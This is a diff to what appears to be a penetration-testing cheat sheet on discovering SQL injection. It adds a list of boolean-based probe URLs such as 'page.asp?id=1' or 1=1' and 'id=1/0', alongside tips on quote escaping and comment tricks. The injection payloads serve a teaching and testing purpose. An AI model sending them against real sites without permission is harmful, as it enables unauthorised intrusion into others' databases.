@@ -16,7 +16,12 @@
 ### Discovery SQLi
 
 1.  If a ' is causing the error try to see if \' will result in success message (since the backslash cancels out the single quote in MySQL).
-- sas
+- page.asp?id=1 or 1=1 -- true
+- page.asp?id=1' or 1=1 -- true
+- page.asp?id=1" or 1=1 -- true
+- page.asp?id=1 and 1=2 -- false
+- product.asp?id=1/1 -- true
+- product.asp?id=1/0 -- false
 
 2.  You can also try if commenting out the ' results in a success message like: %23' or --'. This is because you tell MySQL to explicitly ignore everything after the comment include the extra '.
 
